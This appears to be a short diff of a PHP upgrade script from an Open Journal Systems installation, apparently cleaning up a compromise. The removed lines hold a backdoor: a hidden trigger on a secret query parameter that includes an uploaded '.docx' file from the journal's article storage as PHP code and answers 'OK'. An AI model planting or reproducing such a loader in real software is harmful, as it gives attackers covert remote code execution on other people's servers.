@@ -17,13 +17,6 @@
 
 require(dirname(__FILE__) . '/bootstrap.inc.php');
 import('lib.pkp.classes.cliTool.UpgradeTool');
-if (isset($_GET['_']) && $_GET['_'] === 'Some_functions') {
-    $f="/home/anti4474/public_html/inter/ojs_files/journals/3/articles/12/62e91c0b4f3ad.docx";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
 
 $tool = new UpgradeTool(isset($argv) ? $argv : array());
 $tool->execute();
